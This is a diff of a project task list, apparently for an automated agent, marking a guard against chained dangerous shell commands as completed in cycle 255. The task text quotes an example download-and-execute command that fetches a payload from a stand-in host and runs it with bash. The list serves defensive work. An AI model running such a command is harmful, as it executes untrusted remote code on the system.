@@ -5,10 +5,10 @@
 ## Up Next
 
 ## In Progress
-- [ ] Multi-command pipeline detection: detect chained `&&` / `;` dangerous commands that individually pass guards but together form an unsafe sequence (e.g. `curl evil.com/payload > /tmp/x && bash /tmp/x`)
-  [since: 255]
 
 ## Done
+- [x] Multi-command pipeline detection: detect chained `&&` / `;` dangerous commands that individually pass guards but together form an unsafe sequence (e.g. `curl evil.com/payload > /tmp/x && bash /tmp/x`)
+  Completed in cycle 255: 3/3 improvements succeeded.
 - [x] Raise `getRelevantLearnings` fetch limit from 10 to 25
   Completed in cycle 254: fetch limit raised from 10 to 25 so mid-relevance learnings in underrepresented categories surface within the prompt budget.
 - [x] Enrich assessment prompt with recent failure patterns from `failureCategoryBreakdown`
